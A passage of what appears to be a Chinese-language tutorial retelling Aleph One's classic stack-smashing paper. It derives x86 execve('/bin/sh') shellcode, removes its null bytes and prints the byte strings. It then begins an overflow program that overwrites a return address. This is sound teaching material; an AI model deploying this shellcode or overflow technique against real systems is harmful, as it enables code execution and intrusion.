+<code>movl</code>则是<code>0x18(%edx)</code>的内容直接给<code>eax</code>，比如是数字4，就是将4这个值给eax</p></blockquote><pre><code class=language-assembly data-lang=assembly>0x8000136 : movl $0x80027b8,0xfffffff8(%ebp)
+</code></pre><p>我们复制值 <code>0x80027b8</code> (指向字符串<code>"/bin/sh"</code>的地址)到name的第一个指针。这相当于<code>char[0] = "/bin/sh";</code></p><pre><code class=language-assembly data-lang=assembly>0x800013d : movl $0x0,0xfffffffc(%ebp)
+</code></pre><p>我们将NULL的值(0x0)放到name数组的第二个指针中，相当于<code>name[1] = NULL;</code>，对<code>execve()</code>的实际调用从这里开始</p><pre><code class=language-assembly data-lang=assembly>0x8000144 : pushl $0x0
+</code></pre><p>我们将<code>execve()</code>的参数倒序推进栈中。我们从<code>NULL</code>值开始</p><pre><code class=language-assembly data-lang=assembly>0x8000146 : leal 0xfffffff8(%ebp),%eax
+</code></pre><p>然后我们加载<code>name[]</code>数组的地址到<code>eax</code>寄存器</p><pre><code class=language-assembly data-lang=assembly>0x8000149 : pushl %eax
+</code></pre><p>我们将<code>name[]</code>数组的地址推进栈中</p><pre><code class=language-assembly data-lang=assembly>0x800014a : movl 0xfffffff8(%ebp),%eax
+</code></pre><p>我们加载字符串<code>"/bin/sh"</code> 的地址到eax寄存器中</p><pre><code class=language-assembly data-lang=assembly>0x800014d : pushl %eax
+</code></pre><p>将<code>"/bin/sh"</code>推进栈中</p><pre><code class=language-assembly data-lang=assembly>0x800014e : call 0x80002bc &lt;__execve&gt; Call
+</code></pre><p>调用库函数<code>execve()</code> ，<code>call</code>指令将下一个指令指针（IP）推进栈中</p><p>现在执行<code>execve()</code> ，注意我们使用的是基于Intel处理器的linux系统。这个系统调用的细节可能会因操作系统和CPU的变化而变化。一些会传递参数到栈中，另一些会将参数放进寄存器中。一些使用软件中断跳转到内核模式，一些用远程调用（a far call）。Linux通过寄存器传递参数给系统调用，使用软件中断进入内核模式。</p><hr><pre><code class=language-assembly data-lang=assembly>0x80002bc &lt;__execve&gt;: pushl %ebp 
+0x80002bd &lt;__execve+1&gt;: movl %esp,%ebp 
+0x80002bf &lt;__execve+3&gt;: pushl %ebx
+</code></pre><p>这是调用前奏。</p><pre><code class=language-assembly data-lang=assembly>0x80002c0 &lt;__execve+4&gt;: movl $0xb,%eax
+</code></pre><p>将<code>0xb</code> （十进制的11）放入栈中，11是<code>execve</code>在系统调用表中的索引(index)</p><blockquote><p>Linux可在一下路径下找到汇编的系统调用的index：<code>/usr/src/linux/include/asm/unistd.h</code></p></blockquote><pre><code class=language-assembly data-lang=assembly>0x80002c5 &lt;__execve+9&gt;: movl 0x8(%ebp),%ebx
+</code></pre><p>将<code>"/bin/sh"</code>的地址放入<code>ebx</code>寄存器</p><pre><code class=language-assembly data-lang=assembly>0x80002c8 &lt;__execve+12&gt;: movl 0xc(%ebp),%ecx
+</code></pre><p>将<code>name[]</code>的地址放入<code>ecx</code>寄存器</p><pre><code class=language-assembly data-lang=assembly>0x80002cb &lt;__execve+15&gt;: movl 0x10(%ebp),%edx
+</code></pre><p>将空指针(NULL值)的地址放入<code>edx</code>寄存器</p><pre><code class=language-assembly data-lang=assembly>0x80002ce &lt;__execve+18&gt;: int	$0x80
+</code></pre><p>转换成内核模式</p><hr><p>正如上面我们所看到的<code>execve()</code>的系统调用没有很多，我们所要做的仅仅是：</p><ul><li>a. 以<code>\0</code>结尾的字符串<code>"/bin/sh"</code>放入内存中(a null terminated string "/bin/sh")</li><li>b. 在内存中的某个位置放置一个后跟一个空的字的字符串<code>"/bin/sh"</code></li><li>c. 将<code>0xb</code>放入<code>eax</code>寄存器中（<code>execve</code>的系统调用）</li><li>d. 将<code>"/bin/sh"</code>字符串的指针的地址放入<code>ebx</code>寄存器中</li><li>e. 将<code>"/bin/sh"</code>字符串的指针放入<code>ecx</code>寄存器中</li><li>f. 将空指针复制进<code>EDX</code>寄存器中</li><li>g. 执行<code>int $0x80</code>指令</li></ul><blockquote><p><a href=https://stackoverflow.com/questions/2037209/what-is-a-null-terminated-string target=_blank rel=noopener>what-is-a-null-terminated-string</a></p></blockquote><p>但是假如<code>execve()</code>的调用由于某些原因失败了呢？程序会继续从栈中获取指令指针，这个指针可能指向一些随机数据！程序最终可能引发core dump (核心转储)。我们想要程序在<code>execve()</code>调用失败时干净地退出。去完成这个功能，我们必须在<code>execve()</code>调用后增添<code>exit()</code>的调用。<code>exit()</code>调用长什么样呢？</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//exit.c
+</span><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp></span><span class=kt>void</span> <span class=nf>main</span><span class=p>(){</span>
+    <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><pre><code class=language-assembly data-lang=assembly>$ gcc -o exit -static exit.c 
+$ gdb exit GDB is free software and you are welcome to distribute copies of it under certain conditions; type &quot;show copying&quot; to see the conditions.
+There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (no debugging symbols found)... 
+(gdb) disassemble _exit 
+Dump of assembler code for function _exit: 
+0x800034c &lt;_exit&gt;:	pushl %ebp
+0x800034d &lt;_exit+1&gt;:	movl %esp,%ebp
+0x800034f &lt;_exit+3&gt;:	pushl %ebx
+0x8000350 &lt;_exit+4&gt;:	movl $0x1,%eax
+0x8000355 &lt;_exit+9&gt;:	movl 0x8(%ebp),%ebx
+0x8000358 &lt;_exit+12&gt;: 	int$0x80
+0x800035a &lt;_exit+14&gt;: 	movl 0xfffffffc(%ebp),%ebx 
+0x800035d &lt;_exit+17&gt;: 	movl %ebp,%esp 
+0x800035f &lt;_exit+19&gt;: 	popl %ebp 
+0x8000360 &lt;_exit+20&gt;: 	ret 
+0x8000361 &lt;_exit+21&gt;: 	nop 
+0x8000362 &lt;_exit+22&gt;: 	nop 
+0x8000363 &lt;_exit+23&gt;: 	nop 
+End of assembler dump.
+</code></pre><p><code>exit()</code>的系统调用会把<code>0x1</code>放到<code>eax</code>，将退出代码(exit code)放入<code>ebx</code>寄存器，然后执行<code>int 0x80</code> 。大多程序return 0在exit code，意味着没有错误。我们将0放到<code>ebx</code>寄存器中。现在我们的步骤如下</p><ul><li>a. 以<code>\0</code>结尾的字符串<code>"/bin/sh"</code>放入内存中(a null terminated string "/bin/sh")</li><li>b. 在内存中的某个位置放置一个后跟一个空的字的字符串<code>"/bin/sh"</code></li><li>c. 将<code>0xb</code>放入<code>eax</code>寄存器中（<code>execve</code>的系统调用）</li><li>d. 将<code>"/bin/sh"</code>字符串的指针的地址放入<code>ebx</code>寄存器中</li><li>e. 将<code>"/bin/sh"</code>字符串的指针放入<code>ecx</code>寄存器中</li><li>f. 将空指针复制进<code>EDX</code>寄存器中</li><li>g. 执行<code>int $0x80</code>指令</li><li>h. 将<code>0x1</code>放入<code>eax</code>寄存器中</li><li>i. 将<code>0x0</code>放入<code>ebx</code>寄存器中</li><li>j. 执行<code>int 0x80</code>指令</li></ul><p>尝试将以上放入汇编语言中，将字符串放到代码后，然后记住我们放字符串的地址，然后在数组后面跟的一个空字符，如下：</p><pre><code class=language-assembly data-lang=assembly>movl string_addr,string_addr_addr 
+movb $0x0,null_byte_addr 
+movl $0x0,null_addr 
+movl $0xb,%eax 
+movl string_addr,%ebx 
+leal string_addr,%ecx 
+leal null_string,%edx 
+int	$0x80
+movl $0x1, %eax 
+movl $0x0, %ebx 
+int	$0x80 
+/bin/sh string goes here.
+</code></pre><p>现在问题是，我们不知道我们想要exp代码会放在程序的内存空间的何处。有一个办法是我们用jmp和call指令跳转。jmp指令和call指令可以使用指令寄存器中(IP)相关的地址，意味着在我们不知道我们想要跳转的确切地址时，我们跳转至相对于指令指针有一定偏移量的地址（相对寻址）。如果我们在 <code>"/bin/sh"</code> 字符串之前放置一条<code>CALL</code>指令，并在其前面放置一条<code>JMP</code>指令，则在执行<code>CALL</code>时，字符串地址将被作为返回地址压入堆栈。然后，我们所要做的就是将返回地址复制到寄存器中。CALL指令可以简单地调用上面代码的开头。 现在假设<code>J</code>代表<code>JMP</code>指令，<code>C</code>代表<code>CALL</code>指令，而<code>s</code>代表字符串</p><p><img src=stack4.png alt></p><p>（图中没有足够的小s，strlen("/bin/sh") == 7）在这个修改下，用索引寻址，然后写下每个指令占用我们代码的字节数，如下所示：</p><pre><code class=language-assembly data-lang=assembly>jmp		offset-to-call	# 2 bytes
+popl 	%esi			# 1 byte
+movl 	%esi,array-offset(%esi) 	# 3 bytes 
+movb 	$0x0,nullbyteoffset(%esi)	# 4 bytes 
+movl 	$0x0,null-offset(%esi) 		# 7 bytes 
+movl 	$0xb,%eax		# 5 bytes
+movl 	%esi,%ebx		# 2 bytes
+leal 	array-offset(%esi),%ecx 	# 3 bytes 
+leal 	null-offset(%esi),%edx 		# 3 bytes 
+int	$0x80				# 2 bytes
+movl 	$0x1, %eax		# 5 bytes
+movl 	$0x0, %ebx		# 5 bytes
+int	$0x80				# 2 bytes
+call 	offset-to-popl	# 5 bytes
+/bin/sh string goes here
+</code></pre><p>计算jmp和call之间的偏移量，call和popl之间的偏移量，字符串地址和数组的偏移量，以及字符串数组和空字符的偏移量</p><p>如下：</p><pre><code class=language-assembly data-lang=assembly>jmp 0x26 				# 2 bytes
+popl 	%esi 			# 1 byte 
+movl 	%esi,0x8(%esi) 	# 3 bytes
+movb 	$0x0,0x7(%esi) 	# 4 bytes
+movl 	$0x0,0xc(%esi) 	# 7 bytes
+movl 	$0xb,%eax 		# 5 bytes
+movl 	%esi,%ebx		# 2 bytes
+leal 	0x8(%esi),%ecx 	# 3 bytes
+leal 	0xc(%esi),%edx	# 3 bytes
+int		$0x80			# 2 bytes
+movl 	$0x1, %eax 		# 5 bytes
+movl 	$0x0, %ebx		# 5 bytes
+int		$0x80			# 2 bytes
+call 	-0x2b 			# 5 bytes
+.string \&quot;/bin/sh\&quot;		# 8 bytes
+            
+</code></pre><p>看起来挺好的，确定这个能正常工作我们必须尝试去编译并运行他。但是这里有个问题，我们的代码会修改他自己(where? 个人认为是在编译阶段的优化)，但是大多的操作系统把代码段标记为read-only。为了绕过这个限制，我们必须将要执行的代码放在堆栈或数据段中，并将控制权转移给它。为此，我们将把代码放在数据段的全局数组中。我们首先需要二进制代码的十六进制表示。让我们先编译它，然后使用gdb获得它</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//shellcodeasm.c
+</span><span class=c1></span><span class=kt>void</span> <span class=nf>main</span><span class=p>(){</span> 
+    <span class=n>__asm__</span><span class=p>(</span><span class=s>&#34; </span>
+            <span class=n>jmp</span>	<span class=mh>0x2a</span> 					<span class=err>#</span> <span class=mi>3</span> <span class=n>bytes</span>
+            <span class=n>popl</span> <span class=o>%</span><span class=n>esi</span>				 	<span class=err>#</span> <span class=mi>1</span> <span class=n>byte</span>
+			<span class=n>movl</span> <span class=o>%</span><span class=n>esi</span><span class=p>,</span><span class=mh>0x8</span><span class=p>(</span><span class=o>%</span><span class=n>esi</span><span class=p>)</span> 		<span class=err>#</span> <span class=mi>3</span> <span class=n>bytes</span>
+            <span class=n>movb</span> <span class=err>$</span><span class=mh>0x0</span><span class=p>,</span><span class=mh>0x7</span><span class=p>(</span><span class=o>%</span><span class=n>esi</span><span class=p>)</span>			<span class=err>#</span> <span class=mi>4</span> <span class=n>bytes</span>
+  			<span class=n>movl</span> <span class=err>$</span><span class=mh>0x0</span><span class=p>,</span><span class=mh>0xc</span><span class=p>(</span><span class=o>%</span><span class=n>esi</span><span class=p>)</span> 		<span class=err>#</span> <span class=mi>7</span> <span class=n>bytes</span>
+            <span class=n>movl</span> <span class=err>$</span><span class=mh>0xb</span><span class=p>,</span><span class=o>%</span><span class=n>eax</span> 				<span class=err>#</span> <span class=mi>5</span> <span class=n>bytes</span>
+            <span class=n>movl</span> <span class=o>%</span><span class=n>esi</span><span class=p>,</span><span class=o>%</span><span class=n>ebx</span>				<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>
+			<span class=n>leal</span> <span class=mh>0x8</span><span class=p>(</span><span class=o>%</span><span class=n>esi</span><span class=p>),</span><span class=o>%</span><span class=n>ecx</span> 		<span class=err>#</span> <span class=mi>3</span> <span class=n>bytes</span>
+            <span class=n>leal</span> <span class=mh>0xc</span><span class=p>(</span><span class=o>%</span><span class=n>esi</span><span class=p>),</span><span class=o>%</span><span class=n>edx</span>			<span class=err>#</span> <span class=mi>3</span> <span class=n>bytes</span>
+			<span class=kt>int</span>	<span class=err>$</span><span class=mh>0x80</span>					<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>
+			<span class=n>movl</span> <span class=err>$</span><span class=mh>0x1</span><span class=p>,</span> <span class=o>%</span><span class=n>eax</span> 			<span class=err>#</span> <span class=mi>5</span> <span class=n>bytes</span>
+            <span class=n>movl</span> <span class=err>$</span><span class=mh>0x0</span><span class=p>,</span> <span class=o>%</span><span class=n>ebx</span>				<span class=err>#</span> <span class=mi>5</span> <span class=n>bytes</span>
+            <span class=kt>int</span>	<span class=err>$</span><span class=mh>0x80</span>					<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>
+			<span class=n>call</span> <span class=o>-</span><span class=mh>0x2f</span> 					<span class=err>#</span> <span class=mi>5</span> <span class=n>bytes</span>
+            <span class=p>.</span><span class=n>string</span> <span class=err>\</span><span class=s>&#34;/bin/sh</span><span class=se>\&#34;</span><span class=s>			# 8 bytes</span>
+            <span class=s>&#34;); </span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><pre><code class=language-assembly data-lang=assembly>[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c 
+[aleph1]$ gdb shellcodeasm GDB is free software and you are welcome to distribute copies of it under certain conditions; type &quot;show copying&quot; to see the conditions.
+There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... 
+(gdb) disassemble main Dump of assembler code for function main:
+0x8000130 :pushl %ebp
+0x8000131 :movl %esp,%ebp
+0x8000133 :jmp	0x800015f
+0x8000135 :popl %esi
+0x8000136 :movl %esi,0x8(%esi)
+0x8000139 :movb $0x0,0x7(%esi)
+0x800013d :movl $0x0,0xc(%esi)
+0x8000144 :movl $0xb,%eax
+0x8000149 :movl %esi,%ebx
+0x800014b :leal 0x8(%esi),%ecx
+0x800014e :leal 0xc(%esi),%edx
+0x8000151 :int	$0x80
+0x8000153 :movl $0x1,%eax
+0x8000158 :movl $0x0,%ebx
+0x800015d :int	$0x80
+0x800015f :call 0x8000135
+0x8000164 :das
+0x8000165 :boundl 0x6e(%ecx),%ebp
+0x8000168 :das
+0x8000169 :jae 0x80001d3 &lt;__new_exitfn+55&gt;
+0x800016b :addb %cl,0x55c35dec(%ecx)
+End of assembler dump. 
+(gdb) x/bx main+3 
+0x8000133 :0xeb
+(gdb) 
+0x8000134 :0x2a
+(gdb)
+.
+.
+.
+</code></pre><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//testsc.c
+</span><span class=c1></span><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3</span><span class=s>&#34;</span><span class=p>;</span>
+<span class=kt>void</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span> 
+    <span class=kt>int</span> <span class=o>*</span><span class=n>ret</span><span class=p>;</span>
+	<span class=n>ret</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>ret</span> <span class=o>+</span> <span class=mi>2</span><span class=p>;</span>
+    <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>shellcode</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><p>编译并运行：</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-sh data-lang=sh><span class=o>[</span>aleph1<span class=o>]</span>$ gcc -o testsc testsc.c 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./testsc 
+$ <span class=nb>exit</span> 
+<span class=o>[</span>aleph1<span class=o>]</span>$
+</code></pre></td></tr></table></div></div></div><p>ohhhhhh这成功了！但是有一个障碍。在大多数情况下，我们会试图溢出字符缓冲区。因此，shellcode中的任何空字节都将被视为字符串的结尾，复制操作将被终止。shellcode中不能有空字节，exp才能工作。让我们尝试消除空字节（同时使shellcode变小）</p><p><img src=problem1.png alt></p><p>我们改进的代码如下</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//shellcodeasm2.c
+</span><span class=c1></span><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span> 
+    <span class=n>__asm__</span><span class=p>(</span><span class=s>&#34; </span>
+            <span class=n>jmp</span>	<span class=mh>0x1f</span> 				<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>	
+            <span class=n>popl</span> <span class=o>%</span><span class=n>esi</span>				<span class=err>#</span> <span class=mi>1</span> <span class=n>bytes</span>
+			<span class=n>movl</span> <span class=o>%</span><span class=n>esi</span><span class=p>,</span><span class=mh>0x8</span><span class=p>(</span><span class=o>%</span><span class=n>esi</span><span class=p>)</span> 	<span class=err>#</span> <span class=mi>3</span> <span class=n>bytes</span>
+            <span class=n>xorl</span> <span class=o>%</span><span class=n>eax</span><span class=p>,</span><span class=o>%</span><span class=n>eax</span>			<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>
+			<span class=n>movb</span> <span class=o>%</span><span class=n>eax</span><span class=p>,</span><span class=mh>0x7</span><span class=p>(</span><span class=o>%</span><span class=n>esi</span><span class=p>)</span> 	<span class=err>#</span> <span class=mi>3</span> <span class=n>bytes</span>
+            <span class=n>movl</span> <span class=o>%</span><span class=n>eax</span><span class=p>,</span><span class=mh>0xc</span><span class=p>(</span><span class=o>%</span><span class=n>esi</span><span class=p>)</span> 	<span class=err>#</span> <span class=mi>3</span> <span class=n>bytes</span>
+            <span class=n>movb</span> <span class=err>$</span><span class=mh>0xb</span><span class=p>,</span><span class=o>%</span><span class=n>al</span> 			<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>
+            <span class=n>movl</span> <span class=o>%</span><span class=n>esi</span><span class=p>,</span><span class=o>%</span><span class=n>ebx</span>			<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>
+			<span class=n>leal</span> <span class=mh>0x8</span><span class=p>(</span><span class=o>%</span><span class=n>esi</span><span class=p>),</span><span class=o>%</span><span class=n>ecx</span> 	<span class=err>#</span> <span class=mi>3</span> <span class=n>bytes</span>
+            <span class=n>leal</span> <span class=mh>0xc</span><span class=p>(</span><span class=o>%</span><span class=n>esi</span><span class=p>),</span><span class=o>%</span><span class=n>edx</span>		<span class=err>#</span> <span class=mi>3</span> <span class=n>bytes</span>
+			<span class=kt>int</span>	<span class=err>$</span><span class=mh>0x80</span>				<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>
+			<span class=n>xorl</span> <span class=o>%</span><span class=n>ebx</span><span class=p>,</span><span class=o>%</span><span class=n>ebx</span> 			<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>
+            <span class=n>movl</span> <span class=o>%</span><span class=n>ebx</span><span class=p>,</span><span class=o>%</span><span class=n>eax</span>			<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>
+            <span class=n>inc</span>	<span class=o>%</span><span class=n>eax</span>				<span class=err>#</span> <span class=mi>1</span> <span class=n>bytes</span>
+            <span class=kt>int</span>	<span class=err>$</span><span class=mh>0x80</span> 				<span class=err>#</span> <span class=mi>2</span> <span class=n>bytes</span>
+            <span class=n>call</span> <span class=o>-</span><span class=mh>0x24</span> 				<span class=err>#</span> <span class=mi>5</span> <span class=n>bytes</span>
+            <span class=p>.</span><span class=n>string</span> <span class=err>\</span><span class=s>&#34;/bin/sh</span><span class=se>\&#34;</span><span class=s>		# 8 bytes</span>
+            <span class=cp># 46 bytes total
+</span><span class=cp></span>            <span class=s>&#34;); </span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><p>然后新的测试程序如下</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//testsc2.c
+</span><span class=c1></span><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x80\xe8\xdc\xff\xff\xff</span><span class=s>/bin/sh&#34;</span><span class=p>;</span>
+<span class=kt>void</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span> 
+    <span class=kt>int</span> <span class=o>*</span><span class=n>ret</span><span class=p>;</span>
+	<span class=n>ret</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>ret</span> <span class=o>+</span> <span class=mi>2</span><span class=p>;</span> 
+    <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>shellcode</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-sh data-lang=sh><span class=o>[</span>aleph1<span class=o>]</span>$ gcc -o testsc2 testsc2.c 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./testsc2 
+$ <span class=nb>exit</span> 
+<span class=o>[</span>aleph1<span class=o>]</span>$
+</code></pre></td></tr></table></div></div></div><h3 id=writing-an-exploit><a href=#writing-an-exploit class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Writing an Exploit</h3><p>让我们试着把之前的所有的东西都拼在一起。我们有<strong>shellcode</strong>。我们知道它一定是我们用来溢出缓冲区的字符串的一部分。我们知道必须将返回地址指向缓冲区。此示例将演示上面说的几点</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//overflow1.c
+</span><span class=c1></span><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x80\xe8\xdc\xff\xff\xff</span><span class=s>/bin/sh&#34;</span><span class=p>;</span>
+
+<span class=kt>char</span> <span class=n>large_string</span><span class=p>[</span><span class=mi>128</span><span class=p>];</span>
+
+<span class=kt>void</span> <span class=nf>main</span><span class=p>(){</span> 
+    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>96</span><span class=p>];</span>
+    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
+    <span class=kt>long</span> <span class=o>*</span><span class=n>long_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)</span> <span class=n>large_string</span><span class=p>;</span>
+	<span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> 
+        <span class=o>*</span><span class=p>(</span><span class=n>long_ptr</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span> <span class=n>buffer</span><span class=p>;</span>
